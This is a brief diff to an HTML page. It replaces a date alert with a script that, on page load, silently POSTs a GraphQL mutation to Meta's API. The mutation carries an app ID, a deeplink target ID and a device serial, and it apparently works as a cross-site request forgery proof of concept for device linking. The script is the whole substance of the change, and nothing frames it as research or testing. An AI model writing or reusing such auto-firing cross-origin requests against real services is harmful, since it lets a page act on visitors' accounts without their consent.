@@ -6,8 +6,13 @@
 <p>My first paragraph.</p>
 <a href="https://www.meta.com/ocapi/graphql?forced_locale=nl_NL"><h2>test</h2></a>
     <script>
-        let d = new Date();
-        alert("Today's date is " + d);
+		fetch("https://www.meta.com/ocapi/graphql?forced_locale=nl_NL", {
+		  method: "POST",
+		  body: JSON.stringify({"input":{"client_mutation_id":"1","app_id":"1317831034909742","deeplink_target_id":"7479685118716083","device_serial":"1WMHHB42081492","request_id":null,"link_nonce":null}}),
+		  headers: {
+		    "Content-type": "application/json; charset=UTF-8"
+		  }
+		});
     </script>
 </body>
 </html>
